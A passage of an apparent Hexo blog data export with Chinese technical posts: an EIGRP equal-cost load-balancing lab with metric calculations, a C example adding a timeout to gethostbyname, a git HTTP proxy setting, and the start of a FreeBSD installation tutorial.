set\nKeepalive set (10 sec)\nARP type: ARPA, ARP Timeout 04:00:00\n[10^7/10000+(1000+100)/10]*256=284160\n第二条线路\nR2#sh inter e1/0\nEthernet1/0 is up, line protocol is up\nHardware is AmdP2, address is c801.0d2c.0010 (bia c801.0d2c.0010)\nInternet address is 192.168.1.2/24\nMTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not set\nKeepalive set (10 sec)\nARP type: ARPA, ARP Timeout 04:00:00\nR3#sh inter e1/1\nEthernet1/1 is up, line protocol is up\nHardware is AmdP2, address is c804.0d2c.0011 (bia c804.0d2c.0011)\nInternet address is 192.168.3.1/24\nMTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not set\nKeepalive set (10 sec)\nARP type: ARPA, ARP Timeout 04:00:00\n[10^7/10000+(1000+1000)/10]*256=307200\n只要要两个度量值相同，就可以形成等价负载均衡。\n进入R1 接口F0/1中把延迟改为1000就可以了。\nR1(config-if)#delay 100\n（注意DLY的单位是usec，在配置时，改成delay 100就可以，查看就变成1000usec了，单位问题）\n在不同的环境中，也可以改带宽，设置的带宽并不是物理的，bandwidth 命令只会修改 EIGRP 和 OSPF 等路由协议所用的带宽度量。今天才知道，很郁闷。\n来看下路由表吧。\nR3#sh ip route\nD    192.168.1.0/24 [90/307200] via 192.168.3.2, 00:07:51, Ethernet1/1\n[90/307200] via 192.168.2.1, 00:07:51, Ethernet1/0\nC    192.168.2.0/24 is directly connected, Ethernet1/0\nC    192.168.3.0/24 is directly connected, Ethernet1/1\n&nbsp;","slug":"ERGRP等价负载均衡+度量值计算","published":1,"updated":"2023-04-22T05:38:44.633Z","_id":"clgrjlxd5001s7opi231r8klh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>试验拓扑：<br><img src=\"/images/pic/c42f172187e85a924723e872.jpg\" alt=\"\" /><br>如图用eigrp配置全网络，通。<br>该网络本身就是非等价负载网络。<br>查看个路由器状态<br>R1#sh ip route<br>C    192.168.1.0&#x2F;24 is directly connected, FastEthernet0&#x2F;1<br>C    192.168.2.0&#x2F;24 is directly connected, FastEthernet0&#x2F;0<br>D    192.168.3.0&#x2F;24 [90&#x2F;284160] via 192.168.1.2, 00:16:03, FastEthernet0&#x2F;1<br>R1#R1#sh ip ei topology<br>IP-EIGRP Topology Table for AS(1)&#x2F;ID(1.1.1.1)<br>Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,<br>r - Reply status<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 28160<br>via Connected, FastEthernet0&#x2F;1<br>P 192.168.2.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, FastEthernet0&#x2F;0<br>P 192.168.3.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.1.2 (284160&#x2F;281600), FastEthernet0&#x2F;1<br>via 192.168.2.2 (537600&#x2F;281600), FastEthernet0&#x2F;0<br>R2#sh ip route<br>C    192.168.1.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br>D    192.168.2.0&#x2F;24 [90&#x2F;307200] via 192.168.3.1, 00:17:19, Ethernet1&#x2F;2<br>C    192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;2<br>R2#<br>R2#sh ip ei to<br>IP-EIGRP Topology Table for AS(1)&#x2F;ID(2.2.2.2)<br>Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,<br>r - Reply status<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;0<br>P 192.168.2.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.3.1 (307200&#x2F;281600), Ethernet1&#x2F;2<br>via 192.168.1.1 (537600&#x2F;281600), Ethernet1&#x2F;0, serno 31<br>P 192.168.3.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;2<br>R3#sh ip route<br>D    192.168.1.0&#x2F;24 [90&#x2F;284160] via 192.168.2.1, 00:18:01, Ethernet1&#x2F;0<br>C    192.168.2.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br>C    192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br>R3#sh ip eigrp topology<br>IP-EIGRP Topology Table for AS(1)&#x2F;ID(192.168.3.1)<br>Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,<br>r - Reply status<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.2.1 (284160&#x2F;28160), Ethernet1&#x2F;0<br>via 192.168.3.2 (307200&#x2F;281600), Ethernet1&#x2F;1<br>P 192.168.2.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;0<br>P 192.168.3.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;1<br>就拿R3的topology来说<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.2.1 (284160&#x2F;28160), Ethernet1&#x2F;0<br>via 192.168.3.2 (307200&#x2F;281600), Ethernet1&#x2F;1<br>根据度量值公式来算，本博客有，上一遍就是。<br>求入口带宽最小的，就是R3学到192.168.1.0的更新入端口。第一条线：R1的F0&#x2F;1和R3的E1&#x2F;0。第二条线：R1的E1&#x2F;0和R3的E1&#x2F;1。<br>我们来计算一下<br>首先查去以上端口的BW和延迟，只取重要的啦。<br>第一条线路<br>R1#sh inter f0&#x2F;1<br>FastEthernet0&#x2F;1 is up, line protocol is up<br>Hardware is AmdFE, address is c800.0d2c.0001 (bia c800.0d2c.0001)<br>Internet address is 192.168.1.1&#x2F;24<br>MTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>Half-duplex, 100Mb&#x2F;s, 100BaseTX&#x2F;FX<br>R3#sh inter e1&#x2F;0<br>Ethernet1&#x2F;0 is up, line protocol is up<br>Hardware is AmdP2, address is c804.0d2c.0010 (bia c804.0d2c.0010)<br>Internet address is 192.168.2.2&#x2F;24<br>MTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>ARP type: ARPA, ARP Timeout 04:00:00<br>[10^7&#x2F;10000+(1000+100)&#x2F;10]*256&#x3D;284160<br>第二条线路<br>R2#sh inter e1&#x2F;0<br>Ethernet1&#x2F;0 is up, line protocol is up<br>Hardware is AmdP2, address is c801.0d2c.0010 (bia c801.0d2c.0010)<br>Internet address is 192.168.1.2&#x2F;24<br>MTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>ARP type: ARPA, ARP Timeout 04:00:00<br>R3#sh inter e1&#x2F;1<br>Ethernet1&#x2F;1 is up, line protocol is up<br>Hardware is AmdP2, address is c804.0d2c.0011 (bia c804.0d2c.0011)<br>Internet address is 192.168.3.1&#x2F;24<br>MTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>ARP type: ARPA, ARP Timeout 04:00:00<br>[10^7&#x2F;10000+(1000+1000)&#x2F;10]*256&#x3D;307200<br>只要要两个度量值相同，就可以形成等价负载均衡。<br>进入R1 接口F0&#x2F;1中把延迟改为1000就可以了。<br>R1(config-if)#delay 100<br>（注意DLY的单位是usec，在配置时，改成delay 100就可以，查看就变成1000usec了，单位问题）<br>在不同的环境中，也可以改带宽，设置的带宽并不是物理的，bandwidth 命令只会修改 EIGRP 和 OSPF 等路由协议所用的带宽度量。今天才知道，很郁闷。<br>来看下路由表吧。<br>R3#sh ip route<br>D    192.168.1.0&#x2F;24 [90&#x2F;307200] via 192.168.3.2, 00:07:51, Ethernet1&#x2F;1<br>[90&#x2F;307200] via 192.168.2.1, 00:07:51, Ethernet1&#x2F;0<br>C    192.168.2.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br>C    192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br>&amp;nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>试验拓扑：<br><img src=\"/images/pic/c42f172187e85a924723e872.jpg\" alt=\"\" /><br>如图用eigrp配置全网络，通。<br>该网络本身就是非等价负载网络。<br>查看个路由器状态<br>R1#sh ip route<br>C    192.168.1.0&#x2F;24 is directly connected, FastEthernet0&#x2F;1<br>C    192.168.2.0&#x2F;24 is directly connected, FastEthernet0&#x2F;0<br>D    192.168.3.0&#x2F;24 [90&#x2F;284160] via 192.168.1.2, 00:16:03, FastEthernet0&#x2F;1<br>R1#R1#sh ip ei topology<br>IP-EIGRP Topology Table for AS(1)&#x2F;ID(1.1.1.1)<br>Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,<br>r - Reply status<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 28160<br>via Connected, FastEthernet0&#x2F;1<br>P 192.168.2.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, FastEthernet0&#x2F;0<br>P 192.168.3.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.1.2 (284160&#x2F;281600), FastEthernet0&#x2F;1<br>via 192.168.2.2 (537600&#x2F;281600), FastEthernet0&#x2F;0<br>R2#sh ip route<br>C    192.168.1.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br>D    192.168.2.0&#x2F;24 [90&#x2F;307200] via 192.168.3.1, 00:17:19, Ethernet1&#x2F;2<br>C    192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;2<br>R2#<br>R2#sh ip ei to<br>IP-EIGRP Topology Table for AS(1)&#x2F;ID(2.2.2.2)<br>Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,<br>r - Reply status<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;0<br>P 192.168.2.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.3.1 (307200&#x2F;281600), Ethernet1&#x2F;2<br>via 192.168.1.1 (537600&#x2F;281600), Ethernet1&#x2F;0, serno 31<br>P 192.168.3.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;2<br>R3#sh ip route<br>D    192.168.1.0&#x2F;24 [90&#x2F;284160] via 192.168.2.1, 00:18:01, Ethernet1&#x2F;0<br>C    192.168.2.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br>C    192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br>R3#sh ip eigrp topology<br>IP-EIGRP Topology Table for AS(1)&#x2F;ID(192.168.3.1)<br>Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,<br>r - Reply status<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.2.1 (284160&#x2F;28160), Ethernet1&#x2F;0<br>via 192.168.3.2 (307200&#x2F;281600), Ethernet1&#x2F;1<br>P 192.168.2.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;0<br>P 192.168.3.0&#x2F;24, 1 successors, FD is 281600<br>via Connected, Ethernet1&#x2F;1<br>就拿R3的topology来说<br>P 192.168.1.0&#x2F;24, 1 successors, FD is 284160<br>via 192.168.2.1 (284160&#x2F;28160), Ethernet1&#x2F;0<br>via 192.168.3.2 (307200&#x2F;281600), Ethernet1&#x2F;1<br>根据度量值公式来算，本博客有，上一遍就是。<br>求入口带宽最小的，就是R3学到192.168.1.0的更新入端口。第一条线：R1的F0&#x2F;1和R3的E1&#x2F;0。第二条线：R1的E1&#x2F;0和R3的E1&#x2F;1。<br>我们来计算一下<br>首先查去以上端口的BW和延迟，只取重要的啦。<br>第一条线路<br>R1#sh inter f0&#x2F;1<br>FastEthernet0&#x2F;1 is up, line protocol is up<br>Hardware is AmdFE, address is c800.0d2c.0001 (bia c800.0d2c.0001)<br>Internet address is 192.168.1.1&#x2F;24<br>MTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>Half-duplex, 100Mb&#x2F;s, 100BaseTX&#x2F;FX<br>R3#sh inter e1&#x2F;0<br>Ethernet1&#x2F;0 is up, line protocol is up<br>Hardware is AmdP2, address is c804.0d2c.0010 (bia c804.0d2c.0010)<br>Internet address is 192.168.2.2&#x2F;24<br>MTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>ARP type: ARPA, ARP Timeout 04:00:00<br>[10^7&#x2F;10000+(1000+100)&#x2F;10]*256&#x3D;284160<br>第二条线路<br>R2#sh inter e1&#x2F;0<br>Ethernet1&#x2F;0 is up, line protocol is up<br>Hardware is AmdP2, address is c801.0d2c.0010 (bia c801.0d2c.0010)<br>Internet address is 192.168.1.2&#x2F;24<br>MTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>ARP type: ARPA, ARP Timeout 04:00:00<br>R3#sh inter e1&#x2F;1<br>Ethernet1&#x2F;1 is up, line protocol is up<br>Hardware is AmdP2, address is c804.0d2c.0011 (bia c804.0d2c.0011)<br>Internet address is 192.168.3.1&#x2F;24<br>MTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,<br>reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br>Encapsulation ARPA, loopback not set<br>Keepalive set (10 sec)<br>ARP type: ARPA, ARP Timeout 04:00:00<br>[10^7&#x2F;10000+(1000+1000)&#x2F;10]*256&#x3D;307200<br>只要要两个度量值相同，就可以形成等价负载均衡。<br>进入R1 接口F0&#x2F;1中把延迟改为1000就可以了。<br>R1(config-if)#delay 100<br>（注意DLY的单位是usec，在配置时，改成delay 100就可以，查看就变成1000usec了，单位问题）<br>在不同的环境中，也可以改带宽，设置的带宽并不是物理的，bandwidth 命令只会修改 EIGRP 和 OSPF 等路由协议所用的带宽度量。今天才知道，很郁闷。<br>来看下路由表吧。<br>R3#sh ip route<br>D    192.168.1.0&#x2F;24 [90&#x2F;307200] via 192.168.3.2, 00:07:51, Ethernet1&#x2F;1<br>[90&#x2F;307200] via 192.168.2.1, 00:07:51, Ethernet1&#x2F;0<br>C    192.168.2.0&#x2F;24 is directly connected, Ethernet1&#x2F;0<br>C    192.168.3.0&#x2F;24 is directly connected, Ethernet1&#x2F;1<br>&amp;nbsp;</p>\n"},{"title":"gethostbyname alarm超时处理","date":"2013-04-23T14:15:37.000Z","_content":"在使用gethostbyname DNS查询的时候，处理很慢的情况。使用alarm设置超时时间，并用setjmp进行处理。\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <unistd.h>\n#include <signal.h>\n#include <setjmp.h>\n#include <errno.h>\n#define EXIT_SUCC\texit(0);\n#define\tEXIT_FAIL\texit(-1);\n#define TIME_OUT\t3\njmp_buf\tebuf;\nvoid handler()\n{\n\tlongjmp(ebuf,1);\n}\nint main(int argc, char **argv)\n{\n\tchar\t\t*hostname;\n\tchar\t\tbuff[]=\"request msg\";\n\tstruct \t\tsockaddr_in sevaddr;\n\tint\t\tsockfd, port, iBytes;\n\tstruct\t\thostent *host;\n\tif(argc != 3) {\n\t\tprintf(\"Usage: %s <ip> <port>n\", argv[0]);\n\t\tEXIT_SUCC;\n\t}\n\tif(setjmp(ebuf)) {\n\t\tprintf(\"gethostbyname timeoutn\");\n\t\texit(1);\n\t}\n\thostname = argv[1];\n\tport\t = atoi(argv[2]);\n\tsignal(SIGALRM, handler);\n\talarm(TIME_OUT);\n\tif((host = gethostbyname(hostname)) == NULL) {\n\t\tperror(\"gethostbyname\");\n\t\tEXIT_FAIL;\n\t}\n\talarm(0);\n\tif((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n\t\tperror(\"socket:\");\n\t\tEXIT_FAIL;\n\t}\n\tmemset(&sevaddr, 0x00, sizeof(struct sockaddr_in));\n\tsevaddr.sin_family = AF_INET;\n\tsevaddr.sin_addr = *((struct in_addr *)host->h_addr);\n\tsevaddr.sin_port = htons(port);\n\tprintf(\"connect to remote server ....n\");\n\tif(connect(sockfd, (struct sockaddr *)&sevaddr, sizeof(struct sockaddr_in)) == -1) {\n\t\tperror(\"connect\");\n\t\tEXIT_FAIL;\n\t}\n\tiBytes = send(sockfd, buff, strlen(buff), 0);\n\tif(iBytes < 0) {\n\t\tperror(\"send\");\n\t\tEXIT_FAIL;\n\t}\n\tprintf(\"Send Data :len[%d]buff[%s]n\", iBytes, buff);\n\tclose(sockfd);\n\tEXIT_SUCC;\n}\n</pre>","source":"_posts/gethostbyname-alarm超时处理.md","raw":"title: gethostbyname alarm超时处理\ncategories: [程序设计,C编程]\ntags: [alarm,gethostbyname,jmp_buf,longjmp,setjmp]\ndate: 2013-04-23 22:15:37\n---\n在使用gethostbyname DNS查询的时候，处理很慢的情况。使用alarm设置超时时间，并用setjmp进行处理。\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <unistd.h>\n#include <signal.h>\n#include <setjmp.h>\n#include <errno.h>\n#define EXIT_SUCC\texit(0);\n#define\tEXIT_FAIL\texit(-1);\n#define TIME_OUT\t3\njmp_buf\tebuf;\nvoid handler()\n{\n\tlongjmp(ebuf,1);\n}\nint main(int argc, char **argv)\n{\n\tchar\t\t*hostname;\n\tchar\t\tbuff[]=\"request msg\";\n\tstruct \t\tsockaddr_in sevaddr;\n\tint\t\tsockfd, port, iBytes;\n\tstruct\t\thostent *host;\n\tif(argc != 3) {\n\t\tprintf(\"Usage: %s <ip> <port>n\", argv[0]);\n\t\tEXIT_SUCC;\n\t}\n\tif(setjmp(ebuf)) {\n\t\tprintf(\"gethostbyname timeoutn\");\n\t\texit(1);\n\t}\n\thostname = argv[1];\n\tport\t = atoi(argv[2]);\n\tsignal(SIGALRM, handler);\n\talarm(TIME_OUT);\n\tif((host = gethostbyname(hostname)) == NULL) {\n\t\tperror(\"gethostbyname\");\n\t\tEXIT_FAIL;\n\t}\n\talarm(0);\n\tif((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n\t\tperror(\"socket:\");\n\t\tEXIT_FAIL;\n\t}\n\tmemset(&sevaddr, 0x00, sizeof(struct sockaddr_in));\n\tsevaddr.sin_family = AF_INET;\n\tsevaddr.sin_addr = *((struct in_addr *)host->h_addr);\n\tsevaddr.sin_port = htons(port);\n\tprintf(\"connect to remote server ....n\");\n\tif(connect(sockfd, (struct sockaddr *)&sevaddr, sizeof(struct sockaddr_in)) == -1) {\n\t\tperror(\"connect\");\n\t\tEXIT_FAIL;\n\t}\n\tiBytes = send(sockfd, buff, strlen(buff), 0);\n\tif(iBytes < 0) {\n\t\tperror(\"send\");\n\t\tEXIT_FAIL;\n\t}\n\tprintf(\"Send Data :len[%d]buff[%s]n\", iBytes, buff);\n\tclose(sockfd);\n\tEXIT_SUCC;\n}\n</pre>","slug":"gethostbyname-alarm超时处理","published":1,"updated":"2023-04-22T05:38:44.760Z","_id":"clgrjlxd6001u7opiaee20qlb","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在使用gethostbyname DNS查询的时候，处理很慢的情况。使用alarm设置超时时间，并用setjmp进行处理。</p>\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <unistd.h>\n#include <signal.h>\n#include <setjmp.h>\n#include <errno.h>\n#define EXIT_SUCC\texit(0);\n#define\tEXIT_FAIL\texit(-1);\n#define TIME_OUT\t3\njmp_buf\tebuf;\nvoid handler()\n{\n    longjmp(ebuf,1);\n}\nint main(int argc, char **argv)\n{\n    char\t\t*hostname;\n    char\t\tbuff[]=\"request msg\";\n    struct \t\tsockaddr_in sevaddr;\n    int\t\tsockfd, port, iBytes;\n    struct\t\thostent *host;\n    if(argc != 3) {\n        printf(\"Usage: %s <ip> <port>n\", argv[0]);\n        EXIT_SUCC;\n    }\n    if(setjmp(ebuf)) {\n        printf(\"gethostbyname timeoutn\");\n        exit(1);\n    }\n    hostname = argv[1];\n    port\t = atoi(argv[2]);\n    signal(SIGALRM, handler);\n    alarm(TIME_OUT);\n    if((host = gethostbyname(hostname)) == NULL) {\n        perror(\"gethostbyname\");\n        EXIT_FAIL;\n    }\n    alarm(0);\n    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n        perror(\"socket:\");\n        EXIT_FAIL;\n    }\n    memset(&sevaddr, 0x00, sizeof(struct sockaddr_in));\n    sevaddr.sin_family = AF_INET;\n    sevaddr.sin_addr = *((struct in_addr *)host->h_addr);\n    sevaddr.sin_port = htons(port);\n    printf(\"connect to remote server ....n\");\n    if(connect(sockfd, (struct sockaddr *)&sevaddr, sizeof(struct sockaddr_in)) == -1) {\n        perror(\"connect\");\n        EXIT_FAIL;\n    }\n    iBytes = send(sockfd, buff, strlen(buff), 0);\n    if(iBytes < 0) {\n        perror(\"send\");\n        EXIT_FAIL;\n    }\n    printf(\"Send Data :len[%d]buff[%s]n\", iBytes, buff);\n    close(sockfd);\n    EXIT_SUCC;\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>在使用gethostbyname DNS查询的时候，处理很慢的情况。使用alarm设置超时时间，并用setjmp进行处理。</p>\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <unistd.h>\n#include <signal.h>\n#include <setjmp.h>\n#include <errno.h>\n#define EXIT_SUCC\texit(0);\n#define\tEXIT_FAIL\texit(-1);\n#define TIME_OUT\t3\njmp_buf\tebuf;\nvoid handler()\n{\n    longjmp(ebuf,1);\n}\nint main(int argc, char **argv)\n{\n    char\t\t*hostname;\n    char\t\tbuff[]=\"request msg\";\n    struct \t\tsockaddr_in sevaddr;\n    int\t\tsockfd, port, iBytes;\n    struct\t\thostent *host;\n    if(argc != 3) {\n        printf(\"Usage: %s <ip> <port>n\", argv[0]);\n        EXIT_SUCC;\n    }\n    if(setjmp(ebuf)) {\n        printf(\"gethostbyname timeoutn\");\n        exit(1);\n    }\n    hostname = argv[1];\n    port\t = atoi(argv[2]);\n    signal(SIGALRM, handler);\n    alarm(TIME_OUT);\n    if((host = gethostbyname(hostname)) == NULL) {\n        perror(\"gethostbyname\");\n        EXIT_FAIL;\n    }\n    alarm(0);\n    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n        perror(\"socket:\");\n        EXIT_FAIL;\n    }\n    memset(&sevaddr, 0x00, sizeof(struct sockaddr_in));\n    sevaddr.sin_family = AF_INET;\n    sevaddr.sin_addr = *((struct in_addr *)host->h_addr);\n    sevaddr.sin_port = htons(port);\n    printf(\"connect to remote server ....n\");\n    if(connect(sockfd, (struct sockaddr *)&sevaddr, sizeof(struct sockaddr_in)) == -1) {\n        perror(\"connect\");\n        EXIT_FAIL;\n    }\n    iBytes = send(sockfd, buff, strlen(buff), 0);\n    if(iBytes < 0) {\n        perror(\"send\");\n        EXIT_FAIL;\n    }\n    printf(\"Send Data :len[%d]buff[%s]n\", iBytes, buff);\n    close(sockfd);\n    EXIT_SUCC;\n}\n</pre>"},{"title":"git 设置HTTP代理","date":"2015-09-14T05:00:37.000Z","_content":"git设置HTTP代理，很简单，网上有些比较复杂，应该版本低的问题。一条命令即可。\n<pre>\ngit config --global http.proxy http://10.196.61.92:8080\n</pre>","source":"_posts/git-设置HTTP代理.md","raw":"title: git 设置HTTP代理\ncategories: [版本控制]\ntags: [git,HTTP,proxy]\ndate: 2015-09-14 13:00:37\n---\ngit设置HTTP代理，很简单，网上有些比较复杂，应该版本低的问题。一条命令即可。\n<pre>\ngit config --global http.proxy http://10.196.61.92:8080\n</pre>","slug":"git-设置HTTP代理","published":1,"updated":"2023-04-22T05:38:44.763Z","_id":"clgrjlxd6001w7opibhaa8wuq","comments":1,"layout":"post","photos":[],"link":"","content":"<p>git设置HTTP代理，很简单，网上有些比较复杂，应该版本低的问题。一条命令即可。</p>\n<pre>\ngit config --global http.proxy http://10.196.61.92:8080\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>git设置HTTP代理，很简单，网上有些比较复杂，应该版本低的问题。一条命令即可。</p>\n<pre>\ngit config --global http.proxy http://10.196.61.92:8080\n</pre>"},{"title":"FreeBSD 安装教程","date":"2010-05-16T07:43:00.000Z","_content":"<a name=\"freebsd_安装教程\">FreeBSD 安装教程</a><p>本文以安装 FreeBSD 7.1 (i386) 为示范</p><p>转载来源：http://wiki.freebsdchina.org/howto/i/installbsd</p><p>帮助英语不好的朋友和初学FessDSB的朋友们</p><p>本人其实也是刚开始学用FreeBSD的菜鸟,由于时间空闲,所以想为FreeBSD尽点微薄之力,下文中可能有大量的错误,请老鸟们指正,免得让我误人 子弟.</p><a name=\"freebsd_的下载\">FreeBSD 的下载</a><p>大家可以到 <a href=\"http://www.freebsdchina.org/\" title=\"http://www.freebsdchina.org\" rel=\"nofollow\">http://www.freebsdchina.org</a>  的首页上选择下载,如果只是mini安装的话,只需下载 Disk1 (第一张光盘)就足够了 下载中大家可能看到有  i386和amd64两种版本，i386是32位的操作系统，amd64是64位的操作系统，amd64并不是表示只能使用在amd公司产的64位的系统 上，Intel的相关x86架构上的64位系统也可以使用。 （希望了解相关知识的老鸟们补充一下相关的知识） <a href=\"http://wiki.freebsdchina.org/howto/a/amd64_list\" title=\"howto:a:amd64_list\">支持 FreeBSD amd64 的CPU例表</a></p><a name=\"基本安装过程\">基本安装过程</a><p>OK,让我们开始FreeBSD之旅,直接敲回车,开始安装.</p><a name=\"第一步_选择启动模式\">第一步：选择启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/0-welcome_to_freebsd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:0-welcome_to_freebsd.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_0-welcome_to_freebsd.jpg\" /></a></p><p>上图的内容为； <br />1.启动FreeBSD [默认选项] <br />2.启动FreeBSD，禁用ACPI <br />3.安全模式启动FreeBSD <br />4.单用户模式启动FreeBSD <br />5……..偶也不知道 verbose loggin是啥 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_sad.gif\" alt=\":-(\" /> <br />6.进入启动指令模式（翻译的可能有点问题）<br />7.重启</p><a name=\"第二步_选择国家\">第二步：选择国家</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/1-country_selection.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:1-country_selection.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_1-country_selection.jpg\" /></a></p><p>我们当然是选择China了，如果选择呢，只要使用上下移动键就可以上下移动(我总感觉这句像废话)。移动键在我们键盘的最右手边的一排小键盘的左边，那 四个单独在一起的键，如果你分不清左右的话，我建议你还是拿根绳子自已找棵树吧</p><p>有的朋友可能要问，我已经选好了[China]了，怎么选择 [OK] 或 [Cancel]  呢，只需要按[Tab]键就行了，就可以在两者之间切换，如果你以前不知道，多按几下就明白了，光标会移动到你要进行操作的项目上去的。OK,如果你现在 会了,并能举一反三了,那说明你的智商至少70分以上</p><a name=\"第三步选择键盘类型\">第三步:选择键盘类型</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/2-system_conole_keymap.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:2-system_conole_keymap.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_2-system_conole_keymap.jpg\" /></a></p><p>我们选择[USA <acronym title=\"International Organization for Standardization\">ISO</acronym>]  美式标准键盘</p><a name=\"第四步_进入安装菜单\">第四步：进入安装菜单</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/3-sysinatall_main_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:3-sysinatall_main_menu.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_3-sysinatall_main_menu.jpg\" /></a></p><p>我们选择[Standard]进行安装，如果你想了解更多的关于sysinstall Main Menu的信息请点击<a href=\"http://wiki.freebsdchina.org/howto/i/install/s/sysinstall_main_menu\" title=\"howto:i:install:s:sysinstall_main_menu\" rel=\"nofollow\">sysinstall_main_menu</a></p><a name=\"第五步提示信息\">第五步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/4-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:4-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_4-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第六步硬盘分区\">第六步:硬盘分区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/5-fdisk_partition_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:5-fdisk_partition_editor.jpg\"><img 